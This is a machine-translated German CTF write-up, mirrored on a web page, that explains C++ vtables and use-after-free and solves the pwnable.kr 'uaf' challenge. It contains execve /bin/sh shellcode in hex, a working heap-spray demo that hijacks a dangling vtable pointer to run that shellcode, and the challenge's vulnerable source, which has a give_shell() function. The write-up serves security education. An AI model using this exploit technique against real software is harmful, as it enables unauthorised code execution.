<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧑🏻 🈂️ 🙍🏽 Lösen eines Jobs mit pwnable.kr 16 - uaf. Verwendung nach freier Sicherheitslücke 👨🏽‍⚕️ 🔋 🤟🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel werden wir uns mit UAF befassen und auch die 16. Aufgabe auf der Website pwnable.kr lösen . 

 Organisationsinformationen  Speziell ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Lösen eines Jobs mit pwnable.kr 16 - uaf. Verwendung nach freier Sicherheitslücke</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/462471/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="Bild"></div><br>  In diesem Artikel werden wir uns mit UAF <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">befassen</a> und auch die 16. Aufgabe auf der Website <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pwnable.kr lösen</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Organisationsinformationen</b> <div class="spoiler_text">  Speziell für diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit entwickeln möchten, werde ich über die folgenden Kategorien schreiben und sprechen: <br><ul><li>  PWN; </li><li>  Kryptographie (Krypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Darüber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchführung von Pentests und Schreiben von Exploits teilen. <br><a name="habracut"></a><br>  Damit Sie sich über neue Artikel, Software und andere Informationen informieren können, habe ich <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">in Telegram</a> einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Kanal</a> und eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gruppe eingerichtet, um alle Probleme</a> im Bereich ICD <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zu diskutieren</a> .  Außerdem werde ich Ihre persönlichen Anfragen, Fragen, Vorschläge und Empfehlungen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">persönlich</a> prüfen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">und alle beantworten</a> . <br><cut></cut><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments übernimmt keine Verantwortung für Schäden, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die durch das Studium dieses Dokuments erworben wurden. <br></div></div><br><h2>  Vererbung und virtuelle Methoden </h2><br>  Virtuelle Funktion - in der objektorientierten Programmierung eine Klassenfunktion, die in Nachfolgeklassen überschrieben werden kann.  Daher muss der Programmierer nicht den genauen Typ des Objekts kennen, um mit ihm über virtuelle Methoden arbeiten zu können: Es reicht aus zu wissen, dass das Objekt zur Klasse oder zum Nachkommen der Klasse gehört, in der die Methode deklariert ist. <br><cut></cut><br>  Nehmen wir einfach an, wir haben eine Basisklasse Animal definiert, die eine virtuelle Streifenfunktion hat.  Die Tierklasse kann also zwei Kinderklassen haben: Katze und Hund.  Die virtuelle Funktion Cat: sreak () gibt myau aus und Dog: sreak gibt gav aus.  Aber wenn dieselbe Struktur im Speicher gespeichert ist, wie versteht das Programm, welche der Streifen aufgerufen werden sollen? <br><br>  Alle Arbeiten werden von der Tabelle der virtuellen Methoden (TVM) oder von vtable bereitgestellt. <br><cut></cut><br>  Jede Klasse hat ihren eigenen TVM und der Compiler fügt seinen virtuellen Tabellenzeiger (vptr - Zeiger auf vtable) als erste lokale Variable dieses Objekts hinzu.  Lass es uns überprüfen. <br><pre><code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; class ANIMAL{ private: int var1 = 0x11111111; public: virtual void func1(){ printf("Class Animal - func1\n"); } virtual void func2(){ printf("Class Animal - func2\n"); } }; class CAT : public ANIMAL { public: virtual void func1(){ printf("Class Cat - func1\n"); } virtual void func2(){ printf("Class Cat - func2\n"); } }; int main(){ ANIMAL *p1 = new ANIMAL(); ANIMAL *p2 = new CAT(); ANIMAL *ptr; ptr = p1; ptr-&gt;func1(); ptr-&gt;func2(); ptr = dynamic_cast&lt;CAT*&gt;(p2); ptr-&gt;func1(); ptr-&gt;func2(); return 0; }</span></span></span></span></code> </pre> <br>  Kompilieren und ausführen, um die Ausgabe anzuzeigen. <br><pre> <code class="bash hljs">g++ ex.c -o ex.bin</code> </pre> <br><img src="https://habrastorage.org/webt/33/uo/cl/33uoclc85hu4htwgt3gvr-ekdei.png" alt="Bild"><br><br>  Führen Sie nun unter dem Debugger in der IDA aus und stoppen Sie, bevor Sie die erste Funktion aufrufen.  Gehen Sie zum HEX-View-Fenster und synchronisieren Sie es mit dem RAX-Register. <br><br><img src="https://habrastorage.org/webt/rm/cj/ln/rmcjlnazk5l-qvjzi3gbhuhsvdm.png" alt="Bild"><br><br>  Im ausgewählten Fragment sehen wir den Wert der Variablen var1, wenn Variablen vom Typ ANIMALS und CAT definiert werden.  Wie bereits erwähnt, befinden sich vor beiden Variablen Adressen. Dies sind Zeiger auf VMT (0x559f9898fd90 und 0x559f9898fd70). <br><cut></cut><br>  Mal sehen, was passiert, wenn func1 aufgerufen wird: <br><ol><li>  Zunächst haben wir in RAX mithilfe des ptr-Zeigers eine Adresse für das Objekt. </li><li>  Weiterhin wird in RAX der erste Wert des Objekts gelesen - ein Zeiger auf VMT (auf sein erstes Element). </li><li>  In RAX wird der erste Wert von VMT gelesen - ein Zeiger auf dieselbe virtuelle Methode. </li><li>  In RDX wird ein Zeiger auf das Objekt eingegeben (häufiger dies). </li><li>  Ein virtueller Methodenaufruf wird durchgeführt. </li></ol><br><br><img src="https://habrastorage.org/webt/rw/sl/lf/rwsllfoj_r3n_h8pqcz5ez3xdxk.png" alt="Bild"><br><br>  Wenn func2 aufgerufen wird, passiert dasselbe, mit einer Ausnahme, dass nicht der erste Datensatz (RAX), sondern der zweite (RAX + 8) von VMT gelesen wird.  Dies ist der Mechanismus für die Arbeit mit virtuellen Methoden. <br><br><img src="https://habrastorage.org/webt/vu/jp/qa/vujpqaxpie8rg3hwuiewisoswjc.png" alt="Bild"><br><cut></cut><br><h2>  UAF </h2><br>  Diese Sicherheitsanfälligkeit ist typisch für den Heap, da der Stapel zum Speichern von Daten einer kleinen Menge (lokale Variablen) ausgelegt ist.  Der Heap ist ein dynamischer Speicher und eignet sich perfekt zum Speichern großer Datenmengen.  In diesem Fall kann die Zuweisung und Freigabe des Speichers während der Programmausführung erfolgen.  Aus diesem Grund muss jedoch überwacht werden, welcher Speicher belegt ist und welcher nicht.  Dazu benötigen Sie einen Service-Header für den zugewiesenen Speicherblock.  Es enthält die Startadresse und einen Zeiger auf das erste Element des Blocks.  Und während der Haufen im Gegensatz zum Stapel nach unten wächst. <br><br>  Das Wesentliche an der Sicherheitsanfälligkeit ist, dass das Programm nach dem Freigeben des Speichers möglicherweise auf diesen Bereich verweist.  Es gibt also hängende Zeiger.  Ändern Sie den Programmcode und überprüfen Sie dies. <br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ ANIMAL *p1 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ANIMAL(); ANIMAL *p2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> CAT(); ANIMAL *ptr; ptr = p1; ptr-&gt;func1(); ptr-&gt;func2(); ptr = <span class="hljs-keyword"><span class="hljs-keyword">dynamic_cast</span></span>&lt;CAT*&gt;(p2); ptr-&gt;func1(); ptr-&gt;func2(); <span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> p2; ptr-&gt;func1(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><img src="https://habrastorage.org/webt/cd/wz/d1/cdwzd1qhhkzzjhh9kbrmkith4ci.png" alt="Bild"><br><br>  Lassen Sie uns herausfinden, wo das Programm abstürzt.  In Analogie zum vorherigen Beispiel stoppe ich vor dem Aufrufen der Funktion und synchronisiere Hex-View mit RAX.  Wir sehen, auf welchem ​​Objekt sich unser Objekt befinden soll.  Wenn Sie jedoch die folgende Anweisung ausführen, verbleibt 0 im RAX-Register. Wenn Sie bereits versuchen, 0 zu dereferenzieren, stürzt das Programm ab. <br><br><img src="https://habrastorage.org/webt/a5/oy/zx/a5oyzxx4t_i-rf42au3l7ysas3o.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/rk/fj/tk/rkfjtklkfbmcuvukyejfwx8rgti.png" alt="Bild"><br><br>  Für die Ausnutzung von UAF ist es daher erforderlich, den Shellcode in das Programm zu übertragen und dann über den hängenden Zeiger (in VMT) zu seinem Anfang zu gelangen.  Dies ist möglich, weil der Heap auf Anforderung einen Speicherblock zuweist, der zuvor freigegeben wurde, und auf diese Weise können wir VMT emulieren, das auf Shellcode verweist.  Mit anderen Worten, wo sich zuvor die Adresse der VMT-Funktion befand, befindet sich jetzt die Shellcode-Adresse.  Wir können jedoch nicht garantieren, dass der Speicher für das einzige ausgewählte Objekt mit der gerade gelöschten Zone übereinstimmt. Daher erstellen wir mehrere solcher Objekte in einer Schleife. <br><br>  Schauen wir uns ein Beispiel an.  Nehmen Sie zunächst den Shellcode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">von hier</a> . <br><pre> <code class="cpp hljs"><span class="hljs-string"><span class="hljs-string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span></code> </pre> <br>  Und ergänzen Sie unseren Code: <br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;string.h&gt; class ANIMAL{ private: int var1 = 0x11111111; public: virtual void func1(){ printf("Class Animal - func1\n"); } virtual void func2(){ printf("Class Animal - func2\n"); } }; class CAT : public ANIMAL { public: virtual void func1(){ printf("Class Cat - func1\n"); } virtual void func2(){ printf("Class Cat - func2\n"); } }; class EX_SHELL{ private: char n[8]; public: EX_SHELL(void* addr_in_VMT){ memcpy(n, &amp;addr_in_VMT, sizeof(void*)); } }; char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; int main(){ ANIMAL *p1 = new ANIMAL(); ANIMAL *p2 = new CAT(); ANIMAL *ptr; ptr = p1; ptr-&gt;func1(); ptr-&gt;func2(); ptr = dynamic_cast&lt;CAT*&gt;(p2); ptr-&gt;func1(); ptr-&gt;func2(); delete p2; void* vmt[1]; vmt[0] = (void*) shellcode; for(int i=0; i&lt;0x10000; i++) new EX_SHELL(vmt); ptr-&gt;func1(); return 0; }</span></span></span></span></code> </pre> <br>  Nach dem Kompilieren und Ausführen erhalten wir eine vollständige Shell. <br><br><img src="https://habrastorage.org/webt/dn/m8/ez/dnm8ez66kibzhja7bof98xjk3sg.png" alt="Bild"><br><br><h2>  Uaf Joblösung </h2><br>  Wir klicken auf das von uaf signierte Symbol und es wird uns mitgeteilt, dass wir uns über SSH mit dem Passwort Gast verbinden müssen. <br><br><img src="https://habrastorage.org/webt/ai/4r/-q/ai4r-qsnwqswdyzs5ph9uvg1iqs.png" alt="Bild"><br><br>  Wenn verbunden, sehen wir das entsprechende Banner. <br><br><img src="https://habrastorage.org/webt/ne/bx/18/nebx18bv2viitutyrcuckq1mvzy.png" alt="Bild"><br><br>  Lassen Sie uns herausfinden, welche Dateien sich auf dem Server befinden und welche Rechte wir haben. <br><br><img src="https://habrastorage.org/webt/rr/sv/ug/rrsvug_oodh7hlvnzdhwsagfkhe.png" alt="Bild"><br><br><div class="spoiler">  <b class="spoiler_title">Sehen wir uns den Quellcode an</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;fcntl.h&gt; #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;unistd.h&gt; using namespace std; class Human{ private: virtual void give_shell(){ system("/bin/sh"); } protected: int age; string name; public: virtual void introduce(){ cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1){ cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  Ganz am Anfang des Programms haben wir zwei Objekte von Klassen, die von der Klasse Human geerbt wurden.  Welches hat eine Funktion, die uns eine Hülle gibt. <br><br><img src="https://habrastorage.org/webt/zt/4a/ep/zt4aeptvx5frrqzll5s-mznrx7y.png" alt="Bild"><br><br>  Als nächstes sind wir eingeladen, eine von drei Aktionen vorzustellen: <br><ol><li>  Objektinformationen anzeigen; </li><li>  Schreiben in eine Reihe von Daten, die als Programmparameter akzeptiert werden; </li><li>  Löschen Sie das erstellte Objekt. </li></ol><br><br><img src="https://habrastorage.org/webt/7p/lk/nq/7plknqpzxgbq4kgoh5dk52ief8y.png" alt="Bild"><br><br>  Da die UAF-Sicherheitsanfälligkeit in dieser Aufgabe berücksichtigt wird, sollte der Plan wie folgt aussehen: Erstellen - Löschen - Schreiben auf den Heap - Empfangen von Informationen. <br><cut></cut><br>  Der einzige Schritt, über den wir die volle Kontrolle haben, ist das Schreiben auf den Heap.  Vor der Aufnahme müssen wir jedoch wissen, wie VMT nach diesen Objekten sucht und welche Adresse die Funktion hat, die uns die Shell gibt.  Anhand eines Beispiels haben wir verstanden, wie VMT funktioniert. Zeiger auf Adressen werden nacheinander gespeichert, d. H. <br>  func2 = * func1 + sizeof (* func1), func3 = * func1 + 2 * sizeof (* func2) usw. <br><br>  Da die erste Funktion in VMT give_shell () ist und die Funktion Man :: Introduce () aufgerufen wird, ist die zweite Adresse von VMT die eingegebene Adresse.  Angesichts des 64-Bit-Systems: * Introduce = * give_shell + 8. Wir werden eine Bestätigung dafür finden: <br><br><img src="https://habrastorage.org/webt/uz/3c/-m/uz3c-mkowzsvm9cikvxk58bdf5i.png" alt="Bild"><br><br>  Die Zeile main + 272 bestätigt unsere Annahme, da sich die Adresse relativ zur Basis um 8 erhöht. <br><br>  Legen Sie einen Haltepunkt fest und überprüfen Sie den Inhalt von EAX, um die Basisadresse zu ermitteln. <br><br><img src="https://habrastorage.org/webt/ie/zd/rd/iezdrduch5fu6njt7_bxf1covra.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/u-/mu/ix/u-muixeafwiucui0zofe97mixii.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/ms/eu/qr/mseuqrwyfwkh7vwayzo9rl4vql8.png" alt="Bild"><br><br>  Wir haben die Basisadresse gefunden: 0x0000000000401570.  Daher müssen wir anstelle der Shell die um 8 reduzierte Adresse give_shell () in den Heap schreiben, damit sie als VMT-Basis verwendet wird, während das Programm um 8 erhöht und uns eine Shell gibt. <br><br><img src="https://habrastorage.org/webt/sf/vg/4x/sfvg4xkane1z-htuaxhj2xo7h5a.png" alt="Bild"><br><br>  Das Programm als Parameter ist die Anzahl der Bytes, die es aus der Datei liest, und der Name der Datei.  Es bleibt ein wenig, die Daten zu überschreiben. Sie müssen einen Speicherblock in der Größe eines freigegebenen Blocks zuweisen.  Finden Sie die Größe des Blocks, der ein Objekt belegt. <br><br><img src="https://habrastorage.org/webt/dq/cy/zm/dqcyzmps7r9-cduwnzfst-w99g8.png" alt="Bild"><br><br>  Daher werden vor dem Erstellen des Objekts 0x18 = 24 Bytes reserviert.  Das heißt, wir müssen eine Datei erstellen, die aus 24 Bytes besteht. <br><br><img src="https://habrastorage.org/webt/lu/94/k4/lu94k4006vxgturizvruy7ffye0.png" alt="Bild"><br><br>  Da das Programm zwei Objekte freigibt, müssen wir die Daten zweimal schreiben. <br><br><img src="https://habrastorage.org/webt/wi/hv/v4/wihvv4mnb-t_uvgqw25bvxvivmi.png" alt="Bild"><br><br>  Wir bekommen die Muschel, lesen die Flagge, wir bekommen 8 Punkte. <br><br><img src="https://habrastorage.org/webt/a3/bg/eb/a3bgeb13bwvby4__w5dahqlsbtk.png" alt="Bild"><br><br>  Sie können sich uns <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">per Telegramm anschließen</a> .  Das nächste Mal werden wir uns mit dem Ausrichten des Speichers befassen. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de462471/">https://habr.com/ru/post/de462471/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de462459/index.html">Hinzufügen von ZigBee-Geräten zu Homebridge mithilfe von CC2531</a></li>
<li><a href="../de462461/index.html">Ergebnisse der GOES-17-Crash-Untersuchung</a></li>
<li><a href="../de462465/index.html">Verwenden der nativen Orte von Apple</a></li>
<li><a href="../de462467/index.html">Frontend Weekly Digest (29. Juli - 4. August 2019)</a></li>
<li><a href="../de462469/index.html">Einige Überlegungen zum gleichzeitigen Rechnen in R für "Unternehmens" -Aufgaben</a></li>
<li><a href="../de462473/index.html">Wir entwickeln eine Umgebung für die Arbeit mit Microservices. Teil 1 Installation von Kubernetes HA auf Bare Metal (Debian)</a></li>
<li><a href="../de462475/index.html">Alexey Savvateev: Wie man Korruption mit Hilfe der Mathematik bekämpft (Nobelpreis für Wirtschaftswissenschaften für 2016)</a></li>
<li><a href="../de462477/index.html">Wissenschaftler behaupten, AI sei der Autor eines neuen Patents und versuchen, das Patentrecht zu ändern</a></li>
<li><a href="../de462479/index.html">Eskalation der lokalen Berechtigungen des Steam Windows-Clients 0 Tag</a></li>
<li><a href="../de462481/index.html">Geben Sie System-FAQs ein</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>